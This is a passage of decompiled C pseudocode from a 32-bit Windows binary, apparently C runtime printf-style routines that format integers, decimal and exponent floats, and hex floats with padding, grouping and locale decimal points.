      *(_DWORD *)(a4 + 8) = v55 - v41;
LABEL_71:
      v42 = v57;
      if ( (v57 & 0x800) == 0 )
      {
        if ( v56 >= 0 )
          goto LABEL_63;
        goto LABEL_73;
      }
      v63 -= 2;
      if ( v63 <= 0 )
      {
LABEL_89:
        v47 = v58;
        *(_BYTE *)(v17 + 1) = 48;
        *(_BYTE *)v17 = v47;
        result = (char *)(v17 + 2);
        goto LABEL_90;
      }
      v21 = v17;
      if ( v56 < 0 && (v57 & 0x600) == 0x200 )
        goto LABEL_74;
LABEL_23:
      v17 += 2;
      *(_BYTE *)(v17 - 2) = v58;
      *(_BYTE *)(v21 + 1) = 48;
      if ( (v57 & 0x400) == 0 )
        goto LABEL_64;
      goto LABEL_24;
    }
    goto LABEL_112;
  }
  if ( (v57 & 0x800) != 0 )
  {
    v50 = v59;
    *(_BYTE *)v63 = 48;
    v17 = v50 + 2;
    if ( (char *)(v50 + 2) != v60 )
      goto LABEL_47;
    goto LABEL_59;
  }
  result = (char *)(v63 - (_DWORD)v60);
  if ( v55 > v63 - (int)v60 )
  {
    BYTE1(v18) = BYTE1(v57);
    v63 = v55 - (_DWORD)result;
    *(_DWORD *)(a4 + 8) = v55 - (_DWORD)result;
    goto LABEL_62;
  }
LABEL_117:
  *(_DWORD *)(a4 + 8) = -1;
LABEL_49:
  if ( (unsigned int)v60 < v17 )
  {
    v18 = *(_DWORD *)(v4 + 4);
    v23 = v60;
    v63 = -1;
    v62 = -2;
    goto LABEL_29;
  }
  return result;
}


// ----- sub_405980 @ 0x405980 -----
int __usercall sub_405980@<eax>(unsigned int a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>)
{
  unsigned __int64 v3; // rdi
  int v4; // ebx
  int v5; // eax
  int v6; // ecx
  int v7; // ecx
  int v8; // eax
  void *v9; // esp
  int v10; // eax
  int *v11; // ecx
  unsigned int v12; // esi
  unsigned int v13; // edi
  char v14; // al
  unsigned int v15; // ebx
  int *v16; // esi
  int v17; // eax
  int *v18; // eax
  int v19; // eax
  int v20; // edx
  int *v21; // edi
  int *v22; // esi
  int v23; // eax
  int v24; // eax
  int result; // eax
  int v26; // edx
  int v27; // ecx
  int v28; // edx
  int v29; // eax
  int v30; // eax
  int v31; // eax
  int *v32; // eax
  char Character; // [esp+0h] [ebp-58h]
  int v34; // [esp+10h] [ebp-48h] BYREF
  int v35; // [esp+14h] [ebp-44h]
  int v36; // [esp+18h] [ebp-40h]
  int v37; // [esp+1Ch] [ebp-3Ch]
  int v38; // [esp+20h] [ebp-38h]
  int *v39; // [esp+24h] [ebp-34h]
  int v40; // [esp+28h] [ebp-30h]
  int v41; // [esp+2Ch] [ebp-2Ch]
  int *v42; // [esp+30h] [ebp-28h]
  int v43; // [esp+34h] [ebp-24h]
  unsigned __int64 v44; // [esp+38h] [ebp-20h]

  v3 = __PAIR64__(a1, a2);
  v4 = a3;
  v5 = *(_DWORD *)(a3 + 12);
  v6 = 0;
  v35 = v5;
  if ( v5 >= 0 )
    v6 = v5;
  v7 = v6 + 23;
  v37 = *(_DWORD *)(v4 + 4);
  if ( (v37 & 0x1000) != 0 && *(_WORD *)(v4 + 28) != 0 )
    v7 += v7 / 3u;
  v8 = v7;
  v34 = *(_DWORD *)(v4 + 8);
  if ( v34 >= v7 )
    v8 = v34;
  v9 = alloca(sub_404C70(16 * ((unsigned int)(v8 + 27) >> 4), v7, Character));
  v39 = &v34;
  if ( (v37 & 0x80u) != 0 )
  {
    if ( (v3 & 0x80000000) != 0LL )
    {
      v44 = -__SPAIR64__(v3, HIDWORD(v3));
LABEL_12:
      v11 = v39;
      v36 = v4;
      v38 = v37 & 0x1000;
      while ( 1 )
      {
        if ( v39 != v11 && v38 != 0 && *(_WORD *)(v36 + 28) != 0 && (((char *)v11 - (char *)v39) & 0x80000003) == 3 )
        {
          *(_BYTE *)v11 = 44;
          v11 = (int *)((char *)v11 + 1);
        }
        LOBYTE(v42) = __CFADD__(HIDWORD(v44), (_DWORD)v44)
                    + BYTE4(v44)
                    + v44
                    - (((unsigned int)__CFADD__(HIDWORD(v44), (_DWORD)v44) + HIDWORD(v44) + (_DWORD)v44) / 5
                     + (((3435973837u
                        * (unsigned __int64)((unsigned int)__CFADD__(HIDWORD(v44), (_DWORD)v44)
                                           + HIDWORD(v44)
                                           + (_DWORD)v44)) >> 32)
                      & 0xFC));
        v43 = 0;
        v12 = -858993459
            * (((unsigned int)__CFADD__(HIDWORD(v44), (_DWORD)v44) + HIDWORD(v44) + (_DWORD)v44) / 5
             + (((3435973837u
                * (unsigned __int64)((unsigned int)__CFADD__(HIDWORD(v44), (_DWORD)v44) + HIDWORD(v44) + (_DWORD)v44)) >> 32)
              & 0xFFFFFFFC)
             - (__CFADD__(HIDWORD(v44), (_DWORD)v44)
              + HIDWORD(v44)));
        v40 = v12 & 1;
        v13 = -858993460
            * (((unsigned int)__CFADD__(HIDWORD(v44), (_DWORD)v44) + HIDWORD(v44) + (_DWORD)v44) / 5
             + (((3435973837u
                * (unsigned __int64)((unsigned int)__CFADD__(HIDWORD(v44), (_DWORD)v44) + HIDWORD(v44) + (_DWORD)v44)) >> 32)
              & 0xFFFFFFFC)
             - (__CFADD__(HIDWORD(v44), (_DWORD)v44)
              + HIDWORD(v44)))
            - 858993459
            * ((v44
              - (__CFADD__(HIDWORD(v44), (_DWORD)v44)
               + HIDWORD(v44)
               + (int)v44
               - (((unsigned int)__CFADD__(HIDWORD(v44), (_DWORD)v44) + HIDWORD(v44) + (_DWORD)v44) / 5
                + (((3435973837u
                   * (unsigned __int64)((unsigned int)__CFADD__(HIDWORD(v44), (_DWORD)v44) + HIDWORD(v44) + (_DWORD)v44)) >> 32)
                 & 0xFFFFFFFC)))) >> 32)
            + ((3435973837u
              * (((unsigned int)__CFADD__(HIDWORD(v44), (_DWORD)v44) + HIDWORD(v44) + (_DWORD)v44) / 5
               + (((3435973837u
                  * (unsigned __int64)((unsigned int)__CFADD__(HIDWORD(v44), (_DWORD)v44) + HIDWORD(v44) + (_DWORD)v44)) >> 32)
                & 0xFFFFFFFC)
               - ((unsigned int)__CFADD__(HIDWORD(v44), (_DWORD)v44)
                + HIDWORD(v44)))) >> 32);
        v41 = 0;
        v14 = (_BYTE)v42 + 5 * (v12 & 1);
        v42 = (int *)((char *)v11 + 1);
        v15 = HIDWORD(v44);
        *(_BYTE *)v11 = v14 + 48;
        if ( __PAIR64__(v15, v44) <= 9 )
          break;
        v11 = v42;
        v44 = __PAIR64__(v13, v12) >> 1;
      }
      v16 = v42;
      v4 = v36;
      if ( v35 > 0 )
      {
        v17 = v35 - ((char *)v42 - (char *)v39);
        if ( v17 <= 0 )
          goto LABEL_26;
        goto LABEL_22;
      }
      if ( v39 != v42 )
        goto LABEL_27;
LABEL_61:
      if ( v35 == 0 )
      {
        if ( v34 <= 0 )
          goto LABEL_34;
        if ( (v37 & 0x1C0) != 0 )
          *(_DWORD *)(v4 + 8) = v34 - 1;
LABEL_33:
        if ( (v37 & 0x400) == 0 )
        {
          v29 = *(_DWORD *)(v4 + 8);
          *(_DWORD *)(v4 + 8) = v29 - 1;
          if ( v29 > 0 )
          {
            do
            {
              sub_404E70(32, v4);
              v30 = *(_DWORD *)(v4 + 8);
              *(_DWORD *)(v4 + 8) = v30 - 1;
            }
            while ( v30 > 0 );
            v37 = *(_DWORD *)(v4 + 4);
          }
        }
        goto LABEL_34;
      }
      goto LABEL_68;
    }
    v10 = v37;
    LOBYTE(v10) = v37 & 0x7F;
    *(_DWORD *)(v4 + 4) = v10;
    v37 = v10;
  }
  v44 = __PAIR64__(v3, HIDWORD(v3));
  if ( v3 != 0 )
    goto LABEL_12;
  v16 = v39;
  v17 = v35;
  if ( v35 <= 0 )
    goto LABEL_61;
LABEL_22:
  v18 = (int *)((char *)v16 + v17);
  if ( (((_BYTE)v18 - (_BYTE)v16) & 1) == 0 || (v16 = (int *)((char *)v16 + 1), *((_BYTE *)v16 - 1) = 48, v16 != v18) )
  {
    do
    {
      *(_BYTE *)v16 = 48;
      v16 = (int *)((char *)v16 + 2);
      *((_BYTE *)v16 - 1) = 48;
    }
    while ( v16 != v18 );
  }
  v16 = v18;
LABEL_26:
  if ( v39 == v16 )
  {
LABEL_68:
    *(_BYTE *)v16 = 48;
    v16 = (int *)((char *)v16 + 1);
  }
LABEL_27:
  if ( v34 <= 0 )
    goto LABEL_34;
  v19 = v34 - ((char *)v16 - (char *)v39);
  *(_DWORD *)(v4 + 8) = v19;
  if ( v19 <= 0 )
    goto LABEL_34;
  if ( (v37 & 0x1C0) != 0 )
    *(_DWORD *)(v4 + 8) = v19 - 1;
  if ( v35 >= 0 || (v37 & 0x600) != 0x200 )
    goto LABEL_33;
  v31 = *(_DWORD *)(v4 + 8);
  *(_DWORD *)(v4 + 8) = v31 - 1;
  if ( v31 > 0 )
  {
    v32 = (int *)((char *)v16 + v31);
    if ( (((_BYTE)v32 - (_BYTE)v16) & 1) == 0 || (v16 = (int *)((char *)v16 + 1), *((_BYTE *)v16 - 1) = 48, v16 != v32) )
    {
      do
      {
        *(_BYTE *)v16 = 48;
        v16 = (int *)((char *)v16 + 2);
        *((_BYTE *)v16 - 1) = 48;
      }
      while ( v16 != v32 );
    }
    *(_DWORD *)(v4 + 8) = -1;
    v16 = v32;
  }
LABEL_34:
  BYTE1(v20) = BYTE1(v37);
  if ( (v37 & 0x80u) == 0 )
  {
    if ( (v37 & 0x100) != 0 )
    {
      *(_BYTE *)v16 = 43;
      v21 = (int *)((char *)v16 + 1);
    }
    else
    {
      v21 = v16;
      if ( (v37 & 0x40) != 0 )
      {
        *(_BYTE *)v16 = 32;
        v21 = (int *)((char *)v16 + 1);
      }
    }
  }
  else
  {
    *(_BYTE *)v16 = 45;
    v21 = (int *)((char *)v16 + 1);
  }
  v22 = v39;
  if ( v39 < v21 )
  {
    while ( 1 )
    {
      v21 = (int *)((char *)v21 - 1);
      if ( (v20 & 0x4000) == 0 )
      {
        v23 = *(_DWORD *)(v4 + 32);
        if ( *(_DWORD *)(v4 + 36) <= v23 )
          goto LABEL_39;
      }
      v24 = *(char *)v21;
      if ( (v20 & 0x2000) == 0 )
        break;
      fputc(v24, *(FILE **)v4);
      ++*(_DWORD *)(v4 + 32);
      if ( v22 == v21 )
        goto LABEL_45;
LABEL_40:
      v20 = *(_DWORD *)(v4 + 4);
    }
    *(_BYTE *)(*(_DWORD *)v4 + *(_DWORD *)(v4 + 32)) = v24;
    v23 = *(_DWORD *)(v4 + 32);
LABEL_39:
    *(_DWORD *)(v4 + 32) = v23 + 1;
    if ( v22 == v21 )
      goto LABEL_45;
    goto LABEL_40;
  }
LABEL_45:
  result = *(_DWORD *)(v4 + 8);
  while ( 1 )
  {
    v26 = result--;
    *(_DWORD *)(v4 + 8) = result;
    if ( v26 <= 0 )
      break;
    v27 = *(_DWORD *)(v4 + 4);
    if ( (v27 & 0x4000) != 0 || (v28 = *(_DWORD *)(v4 + 32), *(_DWORD *)(v4 + 36) > v28) )
    {
      if ( (v27 & 0x2000) != 0 )
        fputc(32, *(FILE **)v4);
      else
        *(_BYTE *)(*(_DWORD *)v4 + *(_DWORD *)(v4 + 32)) = 32;
      v28 = *(_DWORD *)(v4 + 32);
      result = *(_DWORD *)(v4 + 8);
    }
    *(_DWORD *)(v4 + 32) = v28 + 1;
  }
  return result;
}


// ----- sub_405DA0 @ 0x405da0 -----
int __usercall sub_405DA0@<eax>(int a1@<eax>, int a2@<ecx>)
{
  __int16 v3; // dx
  int v4; // eax
  void *v5; // esp
  _BYTE *v6; // esi
  int v7; // edx
  int v8; // eax
  _BYTE *v9; // edi
  int v10; // eax
  int result; // eax
  int v12; // edx
  int v13; // eax
  struct lconv *v14; // eax
  int v15; // eax
  int Character[3]; // [esp+0h] [ebp-48h] BYREF
  _BYTE v17[12]; // [esp+10h] [ebp-38h] BYREF
  int *v18; // [esp+1Ch] [ebp-2Ch]
  _WORD v19[3]; // [esp+26h] [ebp-22h] BYREF
  int v20; // [esp+2Ch] [ebp-1Ch]

  if ( *(_DWORD *)(a1 + 16) == -3 )
  {
    *(_DWORD *)&v19[1] = 0;
    v20 = 0;
    v14 = localeconv();
    v15 = sub_40A740((int)v19, v14->decimal_point, 16, (int)&v19[1]);
    if ( v15 <= 0 )
    {
      v3 = *(_WORD *)(a1 + 20);
    }
    else
    {
      v3 = v19[0];
      *(_WORD *)(a1 + 20) = v19[0];
    }
    *(_DWORD *)(a1 + 16) = v15;
  }
  else
  {
    v3 = *(_WORD *)(a1 + 20);
  }
  if ( v3 == 0 )
    return sub_404E70(46, a1);
  v4 = *(_DWORD *)(a1 + 16);
  v18 = Character;
  v5 = alloca(sub_404C70(16 * ((unsigned int)(v4 + 15) >> 4), a2, Character[0]));
  *(_DWORD *)&v19[1] = 0;
  v6 = v17;
  v20 = 0;
  Character[2] = (int)&v19[1];
  v8 = sub_40A420(v17, v7);
  if ( v8 > 0 )
  {
    v9 = &v17[v8];
    while ( 1 )
    {
      v12 = *(_DWORD *)(a1 + 4);
      ++v6;
      if ( (v12 & 0x4000) == 0 )
      {
        v10 = *(_DWORD *)(a1 + 32);
        if ( *(_DWORD *)(a1 + 36) <= v10 )
          goto LABEL_7;
      }
      v13 = (char)*(v6 - 1);
      if ( (v12 & 0x2000) != 0 )
      {
        fputc(v13, *(FILE **)a1);
        result = *(_DWORD *)(a1 + 32) + 1;
        *(_DWORD *)(a1 + 32) = result;
        if ( v6 == v9 )
          return result;
      }
      else
      {
        *(_BYTE *)(*(_DWORD *)a1 + *(_DWORD *)(a1 + 32)) = v13;
        v10 = *(_DWORD *)(a1 + 32);
LABEL_7:
        result = v10 + 1;
        *(_DWORD *)(a1 + 32) = result;
        if ( v6 == v9 )
          return result;
      }
    }
  }
  return sub_404E70(46, a1);
}


// ----- sub_405EF0 @ 0x405ef0 -----
int __usercall sub_405EF0@<eax>(int a1@<eax>, char *a2@<edx>, int a3@<ecx>, int a4)
{
  int v6; // ecx
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  unsigned int v11; // edx
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  int result; // eax
  int v18; // eax
  int v19; // eax
  int v20; // ecx
  int v21; // ecx
  int v22; // eax
  int v23; // ecx
  int v24; // eax
  int v25; // eax
  int v26; // eax
  int v27; // [esp+8h] [ebp-20h]

  v6 = *(_DWORD *)(a4 + 8);
  if ( a3 <= 0 )
  {
    if ( v6 <= 0 )
    {
      if ( v6 == 0 )
      {
        v25 = *(_DWORD *)(a4 + 12);
        if ( v25 < 0 )
        {
          v10 = -v25;
          *(_DWORD *)(a4 + 8) = -v25;
          if ( (*(_BYTE *)(a4 + 5) & 8) == 0 )
            goto LABEL_46;
          v26 = ~v25;
          *(_DWORD *)(a4 + 8) = v26;
          v10 = v26;
          goto LABEL_45;
        }
      }
    }
    else
    {
      v19 = *(_DWORD *)(a4 + 12);
      v20 = v6 - 1;
      if ( v19 < v20 )
      {
        v10 = v20 - v19;
        if ( v19 > 0 )
        {
          *(_DWORD *)(a4 + 8) = --v10;
          goto LABEL_45;
        }
        goto LABEL_74;
      }
    }
    *(_DWORD *)(a4 + 8) = -1;
    goto LABEL_11;
  }
  if ( a3 > v6 )
  {
    *(_DWORD *)(a4 + 8) = -1;
    if ( (*(_BYTE *)(a4 + 5) & 0x10) == 0 )
      goto LABEL_11;
    if ( *(_WORD *)(a4 + 28) == 0 )
      goto LABEL_11;
    v27 = -1;
    v11 = (a3 + 2) / 3u;
    if ( v11 == 1 )
      goto LABEL_11;
    goto LABEL_8;
  }
  v7 = *(_DWORD *)(a4 + 12);
  v8 = v6 - a3;
  if ( v8 <= v7 )
  {
    *(_DWORD *)(a4 + 8) = -1;
    v9 = *(_DWORD *)(a4 + 4);
    v10 = -1;
LABEL_5:
    if ( (v9 & 0x1000) != 0 && *(_WORD *)(a4 + 28) != 0 )
    {
LABEL_7:
      v27 = v10;
      v11 = (a3 + 2) / 3u;
      if ( v11 != 1 )
      {
LABEL_8:
        v10 = v27;
        while ( v10 > 0 )
        {
          *(_DWORD *)(a4 + 8) = --v10;
          if ( v10 + v11 - 1 - v27 == 0 )
            goto LABEL_45;
        }
LABEL_11:
        if ( a1 == 0 )
        {
LABEL_12:
          v12 = *(_DWORD *)(a4 + 4);
          goto LABEL_13;
        }
LABEL_52:
        sub_404E70(45, a4);
        goto LABEL_16;
      }
      goto LABEL_45;
    }
    goto LABEL_45;
  }
  v10 = v8 - v7;
  if ( v7 > 0 )
  {
    --v10;
    v9 = *(_DWORD *)(a4 + 4);
    *(_DWORD *)(a4 + 8) = v10;
    goto LABEL_5;
  }
LABEL_74:
  v9 = *(_DWORD *)(a4 + 4);
  *(_DWORD *)(a4 + 8) = v10;
  if ( (v9 & 0x800) == 0 )
  {
    if ( a3 <= 0 || (v9 & 0x1000) == 0 || *(_WORD *)(a4 + 28) == 0 )
      goto LABEL_46;
    goto LABEL_7;
  }
  *(_DWORD *)(a4 + 8) = --v10;
  if ( a3 > 0 )
    goto LABEL_5;
LABEL_45:
  if ( v10 <= 0 )
    goto LABEL_11;
LABEL_46:
  if ( a1 != 0 )
  {
    *(_DWORD *)(a4 + 8) = v10 - 1;
    if ( v10 == 1 || (*(_BYTE *)(a4 + 5) & 6) != 0 )
      goto LABEL_52;
    goto LABEL_70;
  }
  v12 = *(_DWORD *)(a4 + 4);
  if ( (v12 & 0x1C0) == 0 )
  {
    v21 = v10 - 1;
    if ( (v12 & 0x600) != 0 )
      goto LABEL_16;
LABEL_49:
    *(_DWORD *)(a4 + 8) = v21;
    do
    {
      sub_404E70(32, a4);
      v22 = *(_DWORD *)(a4 + 8);
      *(_DWORD *)(a4 + 8) = v22 - 1;
    }
    while ( v22 > 0 );
    if ( a1 == 0 )
      goto LABEL_12;
    goto LABEL_52;
  }
  *(_DWORD *)(a4 + 8) = v10 - 1;
  if ( v10 != 1 && (v12 & 0x600) == 0 )
  {
LABEL_70:
    v21 = v10 - 2;
    goto LABEL_49;
  }
LABEL_13:
  if ( (v12 & 0x100) != 0 )
  {
    sub_404E70(43, a4);
  }
  else if ( (v12 & 0x40) != 0 )
  {
    sub_404E70(32, a4);
  }
LABEL_16:
  v13 = *(_DWORD *)(a4 + 8);
  if ( v13 > 0 && (*(_DWORD *)(a4 + 4) & 0x600) == 0x200 )
  {
    *(_DWORD *)(a4 + 8) = v13 - 1;
    do
    {
      sub_404E70(48, a4);
      v24 = *(_DWORD *)(a4 + 8);
      *(_DWORD *)(a4 + 8) = v24 - 1;
    }
    while ( v24 > 0 );
  }
  if ( a3 <= 0 )
  {
    sub_404E70(48, a4);
    v16 = *(_DWORD *)(a4 + 12);
    if ( v16 > 0 || (*(_BYTE *)(a4 + 5) & 8) != 0 )
    {
      sub_405DA0(a4, v23);
      if ( a3 == 0 )
        goto LABEL_39;
      v16 = *(_DWORD *)(a4 + 12);
    }
    else if ( a3 == 0 )
    {
LABEL_33:
      result = v16 - 1;
      *(_DWORD *)(a4 + 12) = result;
      return result;
    }
    *(_DWORD *)(a4 + 12) = a3 + v16;
    do
    {
      sub_404E70(48, a4);
      ++a3;
    }
    while ( a3 != 0 );
  }
  else
  {
    while ( 1 )
    {
      v14 = *a2;
      if ( (_BYTE)v14 != 0 )
        ++a2;
      else
        v14 = 48;
      sub_404E70(v14, a4);
      if ( --a3 == 0 )
        break;
      if ( (*(_BYTE *)(a4 + 5) & 0x10) != 0
        && *(_WORD *)(a4 + 28) != 0
        && (unsigned int)(-1431655765 * a3) <= 0x55555555 )
      {
        sub_404ED0((unsigned __int16 *)(a4 + 28), 1, a4);
      }
    }
    v16 = *(_DWORD *)(a4 + 12);
    if ( v16 <= 0 && (*(_BYTE *)(a4 + 5) & 8) == 0 )
      goto LABEL_33;
    sub_405DA0(a4, v15);
  }
LABEL_39:
  while ( 1 )
  {
    result = *(_DWORD *)(a4 + 12);
    *(_DWORD *)(a4 + 12) = result - 1;
    if ( result <= 0 )
      break;
    v18 = *a2;
    if ( (_BYTE)v18 != 0 )
      ++a2;
    else
      v18 = 48;
    sub_404E70(v18, a4);
  }
  return result;
}


// ----- sub_406330 @ 0x406330 -----
int __usercall sub_406330@<eax>(int a1@<eax>, char *a2@<edx>, int a3@<ecx>, _DWORD *a4)
{
  int v4; // edi
  int i; // ecx
  int v6; // esi
  int v7; // ecx
  int v8; // eax
  int v9; // edx
  __int64 v12; // [esp+18h] [ebp-20h]

  v4 = 1;
  v12 = a3 - 1;
  for ( i = (a3 - 1) / 10; i != 0; i /= 10 )
    ++v4;
  v6 = a4[10];
  if ( v6 == -1 )
  {
    a4[10] = 2;
    v6 = 2;
  }
  v7 = a4[2];
  if ( v6 < v4 )
    v6 = v4;
  v8 = v7 - (v6 + 2);
  if ( v7 <= v6 + 2 )
    v8 = -1;
  a4[2] = v8;
  sub_405EF0(a1, a2, 1, (int)a4);
  a4[3] = a4[10];
  v9 = a4[1];
  a4[1] = v9 | 0x1C0;
  sub_404E70(v9 & 0x20 | 0x45, (int)a4);
  a4[2] += v6 + 1;
  return sub_405980(v12, HIDWORD(v12), (int)a4);
}


// ----- sub_406420 @ 0x406420 -----
int __usercall sub_406420@<eax>(_DWORD *a1@<eax>, _TBYTE a2)
{
  int v3; // edx
  int v4; // edx
  char *v5; // esi
  _TBYTE v7; // [esp+0h] [ebp-28h]
  int v8; // [esp+18h] [ebp-10h] BYREF
  int v9[3]; // [esp+1Ch] [ebp-Ch] BYREF

  v3 = a1[3];
  if ( v3 < 0 )
  {
    a1[3] = 6;
    v4 = 7;
  }
  else
  {
    v4 = v3 + 1;
  }
  *(double *)&v7 = *(double *)&a2;
  v5 = (char *)sub_404D80(2, v4, (int)v9, v7, &v8);
  if ( v9[0] == -32768 )
    sub_4051F0(v8, (int)v5, (int)a1);
  else
    sub_406330(v8, v5, v9[0], a1);
  return sub_4078D0(v5);
}


// ----- sub_4064B0 @ 0x4064b0 -----
int __usercall sub_4064B0@<eax>(int a1@<eax>, _TBYTE a2)
{
  int v3; // edx
  char *v4; // esi
  int v5; // eax
  int v6; // edx
  int v7; // ecx
  int v8; // edx
  _TBYTE Character; // [esp+0h] [ebp-28h]
  int v11; // [esp+18h] [ebp-10h] BYREF
  int v12[3]; // [esp+1Ch] [ebp-Ch] BYREF

  v3 = *(_DWORD *)(a1 + 12);
  if ( v3 < 0 )
  {
    *(_DWORD *)(a1 + 12) = 6;
    v3 = 6;
  }
  *(double *)&Character = *(double *)&a2;
  v4 = (char *)sub_404D80(3, v3, (int)v12, Character, &v11);
  if ( v12[0] == -32768 )
  {
    sub_4051F0(v11, (int)v4, a1);
  }
  else
  {
    sub_405EF0(v11, v4, v12[0], a1);
    v5 = *(_DWORD *)(a1 + 8);
    while ( 1 )
    {
      v6 = v5--;
      *(_DWORD *)(a1 + 8) = v5;
      if ( v6 <= 0 )
        break;
      v7 = *(_DWORD *)(a1 + 4);
      if ( (v7 & 0x4000) != 0 || (v8 = *(_DWORD *)(a1 + 32), *(_DWORD *)(a1 + 36) > v8) )
      {
        if ( (v7 & 0x2000) != 0 )
          fputc(32, *(FILE **)a1);
        else
          *(_BYTE *)(*(_DWORD *)a1 + *(_DWORD *)(a1 + 32)) = 32;
        v8 = *(_DWORD *)(a1 + 32);
        v5 = *(_DWORD *)(a1 + 8);
      }
      *(_DWORD *)(a1 + 32) = v8 + 1;
    }
  }
  return sub_4078D0(v4);
}


// ----- sub_406580 @ 0x406580 -----
int __usercall sub_406580@<eax>(_DWORD *a1@<eax>, _TBYTE a2)
{
  int v3; // edx
  int v4; // eax
  int v5; // ecx
  int v6; // edi
  char *v7; // esi
  int v8; // eax
  int v9; // edx
  int v10; // eax
  size_t v12; // eax
  size_t v13; // eax
  int v14; // eax
  int v15; // edx
  _TBYTE Str; // [esp+0h] [ebp-38h]
  int v17; // [esp+18h] [ebp-20h] BYREF
  int v18[7]; // [esp+1Ch] [ebp-1Ch] BYREF

  v3 = a1[3];
  if ( v3 < 0 )
  {
    a1[3] = 6;
    v3 = 6;
  }
  else if ( v3 == 0 )
  {
    a1[3] = 1;
    v3 = 1;
  }
  *(double *)&Str = *(double *)&a2;
  v4 = sub_404D80(2, v3, (int)v18, Str, &v17);
  v5 = v18[0];
  v6 = v17;
  v7 = (char *)v4;
  if ( v18[0] == -32768 )
  {
    sub_4051F0(v17, v4, (int)a1);
    return sub_4078D0(v7);
  }
  else
  {
    v8 = a1[1] & 0x800;
    if ( v18[0] < -3 || (v9 = a1[3], v18[0] > v9) )
    {
      if ( v8 != 0 )
      {
        --a1[3];
      }
      else
      {
        v12 = strlen(v7);
        v5 = v18[0];
        a1[3] = v12 - 1;
      }
      sub_406330(v6, v7, v5, a1);
      return sub_4078D0(v7);
    }
    else
    {
      if ( v8 != 0 )
      {
        a1[3] = v9 - v18[0];
      }
      else
      {
        v13 = strlen(v7);
        v5 = v18[0];
        v14 = v13 - v18[0];
        a1[3] = v14;
        if ( v14 < 0 )
        {
          v15 = a1[2];
          if ( v15 > 0 )
            a1[2] = v15 + v14;
        }
      }
      sub_405EF0(v6, v7, v5, (int)a1);
      while ( 1 )
      {
        v10 = a1[2];
        a1[2] = v10 - 1;
        if ( v10 <= 0 )
          break;
        sub_404E70(32, (int)a1);
      }
      return sub_4078D0(v7);
    }
  }
}


// ----- sub_4066F0 @ 0x4066f0 -----
int __usercall sub_4066F0@<eax>(unsigned __int64 a1@<edx:eax>, __int16 a2@<cx>, int a3)
{
  int v3; // ebx
  int v4; // edi
  int v5; // edx
  char *v6; // esi
  char v7; // al
  char *v8; // ecx
  unsigned int v9; // eax
  int v10; // ecx
  unsigned __int64 v11; // rax
  int v12; // ett
  char v13; // cl
  char *v14; // eax
  int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // esi
  __int16 v19; // ax
  int v20; // edx
  int v21; // eax
  int v22; // ecx
  int v23; // eax
  int v24; // eax
  int v25; // eax
  int v26; // eax
  int v28; // eax
  __int64 v29; // [esp+8h] [ebp-60h]
  int v30; // [esp+14h] [ebp-54h]
  int v31; // [esp+14h] [ebp-54h]
  __int16 v32; // [esp+1Ah] [ebp-4Eh]
  int v33; // [esp+20h] [ebp-48h]
  char *v34; // [esp+20h] [ebp-48h]
  unsigned __int64 v35; // [esp+28h] [ebp-40h]
  int v36; // [esp+28h] [ebp-40h]
  unsigned __int16 v37; // [esp+36h] [ebp-32h] BYREF
  char v38; // [esp+38h] [ebp-30h] BYREF
  char v39; // [esp+39h] [ebp-2Fh] BYREF

  v3 = a3;
  v35 = a1;
  v4 = *(_DWORD *)(a3 + 12);
  if ( a1 == 0 && a2 == 0 )
  {
    if ( (unsigned int)v4 > 0xE )
    {
      if ( v4 <= 0 )
      {
        v29 = 0;
        v36 = *(_DWORD *)(a3 + 4);
        v32 = 0;
LABEL_27:
        v14 = &v38;
        if ( (v36 & 0x800) == 0 )
        {
LABEL_29:
          *v14 = 48;
          v6 = v14 + 1;
          goto LABEL_36;
        }
LABEL_28:
        v38 = 46;
        v14 = &v39;
        goto LABEL_29;
      }
      v29 = 0;
      v5 = 16;
      v32 = 0;
      v35 = 0;
      goto LABEL_5;
    }
    v29 = 0;
    v11 = 4LL << (4 * (14 - (unsigned __int8)v4));
    v32 = 0;
    goto LABEL_22;
  }
  v32 = a2 - 3;
  if ( (unsigned int)v4 > 0xE )
  {
    v5 = 16;
    v29 = v32;
    if ( v35 == 0 && v4 <= 0 )
    {
LABEL_26:
      v36 = *(_DWORD *)(a3 + 4);
      goto LABEL_27;
    }
    goto LABEL_5;
  }
  v11 = (4LL << (4 * (14 - (unsigned __int8)v4))) + (a1 >> 1);
  if ( (v11 & 0x8000000000000000uLL) == 0LL )
  {
    v29 = v32;
LABEL_22:
    v12 = (v11 + (unsigned int)v11) >> 32;
    LODWORD(v11) = 2 * v11;
    HIDWORD(v11) += v12;
    v13 = 4 * (15 - v4);
    LODWORD(v11) = v11 >> v13;
    HIDWORD(v11) >>= v13;
    if ( (v13 & 0x20) != 0 )
      v11 = HIDWORD(v11);
    v35 = v11;
    if ( v11 == 0 && v4 == 0 )
      goto LABEL_26;
    goto LABEL_19;
  }
  v32 = a2 + 1;
  v35 = v11 >> 3 >> (4 * (15 - (unsigned __int8)v4));
  v29 = (__int16)(a2 + 1);
LABEL_19:
  v5 = v4 + 1;
LABEL_5:
  v6 = &v38;
  v30 = *(_DWORD *)(a3 + 4);
  while ( 1 )
  {
    v9 = v35 & 0xF;
    if ( v5 == 1 )
      break;
    v10 = *(_DWORD *)(a3 + 12);
    if ( v10 > 0 )
      *(_DWORD *)(a3 + 12) = v10 - 1;
LABEL_14:
    if ( (v35 & 0xF) != 0 )
    {
      if ( v9 > 9 )
        goto LABEL_16;
    }
    else if ( &v38 >= v6 && *(int *)(a3 + 12) < 0 )
    {
      goto LABEL_10;
    }
    v7 = v9 + 48;
    v8 = v6;
LABEL_9:
    *v8 = v7;
    ++v6;
LABEL_10:
    v35 >>= 4;
    if ( --v5 == 0 )
    {
      v3 = a3;
      goto LABEL_35;
    }
  }
  if ( &v38 < v6 || (v30 & 0x800) != 0 || (v15 = *(_DWORD *)(a3 + 12)) > 0 )
  {
    *v6++ = 46;
    goto LABEL_14;
  }
  if ( (v35 & 0xF) != 0 )
  {
    if ( v9 <= 9 )
    {
      v3 = a3;
      *v6++ = v9 + 48;
      goto LABEL_35;
    }
LABEL_16:
    v8 = v6;
    v7 = v30 & 0x20 | (v9 + 55);
    goto LABEL_9;
  }
  v3 = a3;
  if ( v15 == 0 )
    *v6++ = 48;
LABEL_35:
  LOWORD(v36) = v30;
  if ( v6 == &v38 )
  {
    if ( *(int *)(v3 + 12) > 0 )
      goto LABEL_28;
    goto LABEL_27;
